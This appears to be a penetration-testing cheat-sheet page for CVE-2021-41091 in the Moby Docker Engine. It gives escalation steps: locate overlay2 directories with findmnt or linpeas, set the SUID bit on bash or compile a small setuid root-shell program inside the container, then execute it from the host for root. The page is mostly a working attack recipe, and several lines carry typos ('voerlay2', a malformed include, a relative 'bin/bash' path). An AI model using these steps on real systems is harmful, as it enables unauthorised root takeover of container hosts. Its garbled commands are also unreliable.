---
description: Directory Traversal & Arbitrary Command Execution (CVE-2021-41091 )
---

# Moby Docker Engine PrivEsc

### Refernces:

[oss-sec: Re: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy\_up (seclists.org)](https://seclists.org/oss-sec/2021/q4/41)

[How Docker Made Me More Capable and the Host Less Secure (cyberark.com)](https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure)

### Escalation Steps

### Find the directory for docker

{% code overflow="wrap" %}
```bash
# Find the directory where the docker is mounted
findmnt
.\linpeas.sh 


# Results e.g.
/var/lib/docker/overlay2/abcdef...xyz/merged
# or 
overlay on / type overlay (rw,relatime,
/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:
/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:
/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:
/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:
/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:
/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:
/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:
/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:
/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:
/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:
/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:
/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:
/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:
/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:
/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:
/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:
/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:
/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:
/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,


upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,


workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)
```
{% endcode %}

### Prepare the SUID binary in the container <a href="#id-2.-prepare-suid-binary-in-container" id="id-2.-prepare-suid-binary-in-container"></a>

```bash
# Login to the docker as a root
chmod u+s /bin/bash

# or create a code like, compile it. 

# include <unistd.h>
# include (stdlib.h>
void main()
{
    setuid(0);
    setgid(0);
    system("bin/bash -p");
}
# gcc -m64 -o suid64 suid.c 
# chmod u+s ./suid64
```

### Execute in the host&#x20;

Back to the host machine, and execute the SUID binary

{% code overflow="wrap" %}
```bash
/var/lib/docker/voerlay2/abdef...xyz/merged/bin/bash -p
# or
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/suid64
```
{% endcode %}
